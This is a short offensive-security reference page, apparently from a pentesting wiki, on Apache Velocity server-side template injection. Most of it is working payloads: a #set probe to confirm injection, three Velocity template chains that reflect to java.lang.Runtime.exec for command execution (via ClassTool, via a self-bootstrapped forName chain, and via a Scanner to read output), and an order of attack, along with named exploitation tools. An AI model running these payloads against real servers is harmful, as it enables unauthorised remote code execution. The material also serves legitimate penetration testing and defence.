---
title: "Velocity server-side template injection"
description: "Exploiting Apache Velocity SSTI: confirming with #set, and reflecting from a class reference through ClassTool to Runtime.getRuntime().exec for command execution."
keywords:
  - Velocity SSTI
  - VelocityTools
  - ClassTool inspect
  - Runtime exec reflection
---

# Velocity

Apache Velocity uses `#set` directives and `$`-references. Confirm injection with `#set($x = 7 * 7)$x` rendering `49` (and `${7*7}` where the context evaluates it). Velocity has no command-execution utility of its own, so RCE is built by reflecting from an object already in scope to `java.lang.Runtime`.

The standard chain obtains a `Class` object, walks to its classloader or directly to `Runtime`, and calls `exec`. When the VelocityTools `ClassTool` is available (exposed as `$class` or similar), it provides the reflection entry point:

```velocity
#set($e = "e")
#set($run = $class.inspect("java.lang.Runtime").type)
#set($i = $run.getRuntime().exec("id"))
$i
```

Without a tool reference, bootstrap the chain from a string you define yourself with `#set`, take its `.class`, and use `forName` to load `Runtime`:

```velocity
#set($s = "")
#set($str = $s.class.forName("java.lang.Runtime"))
#set($rt = $str.getMethod("getRuntime",null).invoke(null,null))
$rt.exec("id")
```

Defining `$s` with `#set($s = "")` guarantees a real object is in scope, instead of relying on a context reference that may not exist. To read the command output (rather than a bare `Process` object), wire the process `InputStream` through a scanner, reusing `$s.class`:

```velocity
#set($proc = $rt.exec("id"))
#set($is = $proc.getInputStream())
#set($scan = $s.class.forName("java.util.Scanner").getConstructor($s.class.forName("java.io.InputStream")).newInstance($is).useDelimiter("\A"))
$scan.next()
```

Exploitability depends less on the context than with other engines, because `#set($s = "")` lets the template create its own object and reach `.class` on it; the practical blocker is a `SecurityManager` restricting reflection, or an event-handler/uberspect configuration that blocks method introspection. Confirm with the `#set` math probe, then try the `ClassTool` form first and fall back to the self-bootstrapped reflection chain.

## Tools

- tplmap, SSTImap

## References

- Apache Velocity and VelocityTools documentation
- PortSwigger Web Security Academy: Server-side template injection
